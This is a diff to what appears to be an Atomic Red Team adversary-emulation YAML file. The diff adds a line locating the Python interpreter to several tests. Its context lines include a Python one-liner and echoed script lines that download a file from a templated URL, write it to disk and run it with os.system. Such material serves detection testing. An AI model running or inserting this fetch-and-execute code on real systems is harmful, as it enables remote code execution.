@@ -33,6 +33,7 @@ atomic_tests:
           pip install requests
     executor: 
       command: |
+        which_python=`which python`
         $which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
       name: sh
       cleanup_command: |
@@ -74,6 +75,7 @@ atomic_tests:
           pip install requests    
     executor: 
       command: |
+        which_python=`which python`
         echo 'import requests' > #{python_script_name}
         echo 'import os' >> #{python_script_name}
         echo 'url = "#{script_url}"' >> #{python_script_name}
@@ -130,6 +132,7 @@ atomic_tests:
           pip install requests    
     executor: 
       command: |
+        which_python=`which python`
         echo 'import requests' > #{python_script_name}
         echo 'import os' >> #{python_script_name}
         echo 'url = "#{script_url}"' >> #{python_script_name}
